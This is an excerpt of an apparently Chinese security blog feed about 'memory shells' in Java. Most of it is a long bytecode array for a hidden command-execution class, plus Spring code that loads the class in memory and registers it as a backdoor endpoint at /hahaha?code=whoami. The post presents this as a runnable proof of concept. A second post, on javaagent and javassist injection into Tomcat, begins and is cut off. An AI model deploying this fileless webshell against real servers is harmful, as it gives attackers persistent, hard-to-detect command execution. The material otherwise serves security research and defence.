<span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">121</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">67</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">40</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">68</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">78</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">119</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">69</span>, <span class="number">114</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">40</span>, <span class="number">73</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">121</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">77</span>, <span class="number">43</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">44</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">4</span>, <span class="number">45</span>, -<span class="number">58</span>, <span class="number">0</span>, -<span class="number">109</span>, <span class="number">18</span>, <span class="number">5</span>, <span class="number">58</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">6</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">9</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">10</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">33</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">89</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">83</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">58</span>, <span class="number">6</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">30</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">89</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">83</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">58</span>, <span class="number">6</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">6</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">19</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">20</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">22</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">58</span>, <span class="number">7</span>, <span class="number">25</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">24</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">25</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">25</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">58</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">25</span>, <span class="number">4</span>, <span class="number">25</span>, <span class="number">5</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">29</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">44</span>, <span class="number">17</span>, <span class="number">1</span>, -<span class="number">12</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">2</span>, <span class="number">0</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">78</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">82</span>, <span class="number">0</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">74</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">120</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, -<span class="number">116</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, -<span class="number">111</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, -<span class="number">104</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, -<span class="number">99</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, -<span class="number">94</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, -<span class="number">91</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, -<span class="number">82</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, -<span class="number">78</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, -<span class="number">119</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">120</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, -<span class="number">91</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, -<span class="number">99</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">77</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">77</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">77</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">115</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="string">&quot;org.m0d9.sec.SpringDemo.SSOLogin&quot;</span>,</span><br><span class="line">                    classData, <span class="number">0</span>, classData.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">ClassLoader parentClassLoader = MyClassLoader.class.getClassLoader();</span><br><span class="line">MyClassLoader classLoader = <span class="keyword">new</span> MyClassLoader(parentClassLoader);</span><br><span class="line">Class myObjectClass = classLoader.loadClass(<span class="string">&quot;reflection.MyObject&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//            WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();</span></span><br><span class="line"><span class="comment">//        WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span></span><br><span class="line"><span class="comment">//        WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span></span><br><span class="line">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span></span><br><span class="line">RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"><span class="comment">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span></span><br><span class="line"><span class="comment">//            Method method = (Class.forName(&quot;org.m0d9.sec.SpringDemo.SSOLogin&quot;).getDeclaredMethods())[0];</span></span><br><span class="line">Method method = myObjectClass.getDeclaredMethods()[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// 3. 定义访问 controller 的 URL 地址</span></span><br><span class="line">PatternsRequestCondition url = <span class="keyword">new</span> PatternsRequestCondition(<span class="string">&quot;/hahaha&quot;</span>);</span><br><span class="line"><span class="comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span></span><br><span class="line">RequestMethodsRequestCondition ms = <span class="keyword">new</span> RequestMethodsRequestCondition();</span><br><span class="line"><span class="comment">// 5. 在内存中动态注册 controller</span></span><br><span class="line">RequestMappingInfo info = <span class="keyword">new</span> RequestMappingInfo(url, ms, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"><span class="comment">//            r.registerMapping(info, Class.forName(&quot;org.m0d9.sec.SpringDemo.SSOLogin&quot;).newInstance(), method);</span></span><br><span class="line">r.registerMapping(info, myObjectClass.newInstance(), method);</span><br></pre></td></tr></table></figure><p>执行之后可以看到registry已经添加成功</p><p><img src="/images/pasted-113.png" alt="upload successful"></p><p><a href="http://localhost:8080/hahaha?code=whoami">http://localhost:8080/hahaha?code=whoami</a> 为后门地址</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>大同小异，其实都是找到上下文，执行恶意的code添加url映射及其对应代码。不过找到这些关键类，还是需要对框架的一定理解。</p><p>这两篇文章中，都没有提到在实际场景下，比如反序列化/fastjson等漏洞中，如何运行这些evil code，留待下篇总结解释。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://www.anquanke.com/post/id/198886">基于内存 Webshell 的无文件攻击技术研究</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;前文tomcat的通用servlet内存马已经基本可以覆盖大部分的情况，针对第三方框架，思路也是一样的，姿势不同。观星实验室的师傅们在参考【1】中提到了关于Sping的姿势，这里学习记录下。&lt;/p&gt;
&lt;h2 id=&quot;Spring&quot;&gt;&lt;a href=&quot;#Spring&quot; class=&quot;headerlink&quot; title=&quot;Spring&quot;&gt;&lt;/a&gt;Spring&lt;/h2&gt;&lt;p&gt;具体的背景不赘述，详见参考【1】，几个重点的步骤&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;获得当前代码运行时的上下文环境&lt;/li&gt;
&lt;li&gt;手动注册 controller&lt;/li&gt;
&lt;li&gt;controller 中的 Webshell 逻辑&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;文中师傅没有给出直接运行的poc，这里给一下&lt;/p&gt;
&lt;h3 id=&quot;Show-me-the-code&quot;&gt;&lt;a href=&quot;#Show-me-the-code&quot; class=&quot;headerlink&quot; title=&quot;Show me the code&quot;&gt;&lt;/a&gt;Show me the code&lt;/h3&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="内存马" scheme="http://m0d9.me/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
    <category term="Spring" scheme="http://m0d9.me/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>Java内存shell：javaagent</title>
    <link href="http://m0d9.me/2020/09/27/Java%E5%86%85%E5%AD%98shell%EF%BC%9Ajavaagent/"/>
    <id>http://m0d9.me/2020/09/27/Java%E5%86%85%E5%AD%98shell%EF%BC%9Ajavaagent/</id>
    <published>2020-09-27T02:05:00.000Z</published>
    <updated>2020-10-27T03:03:24.833Z</updated>
    
    <content type="html"><![CDATA[<p>rebeyond 师傅在参考【1】中提出利用javaagent 永久注入tomcat进程的方案，有几个重要的技术点</p><ol><li>javaagent技术</li><li>javassist技术</li><li>tomcat ApplicationFilterChain.internalDoFilter方法</li><li>ShutdownHook 钩子</li></ol><h2 id="javassist技术"><a href="#javassist技术" class="headerlink" title="javassist技术"></a>javassist技术</h2><blockquote><p>Java 字节码以二进制的形式存储在 .class 文件中，每一个 .class 文件包含一个 Java 类或接口。Javaassist 就是一个用来 处理 Java 字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以去生成一个新的类对象，通过完全手动的方式。</p></blockquote><p>javassist 相关文档可以参考【2】和【3】，以简单的javassist demo<br>为例</p><a id="more"></a><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>目录结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">├── ModifyTarget.java</span><br><span class="line">└── Target.java</span><br></pre></td></tr></table></figure><p>其中Target为Demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 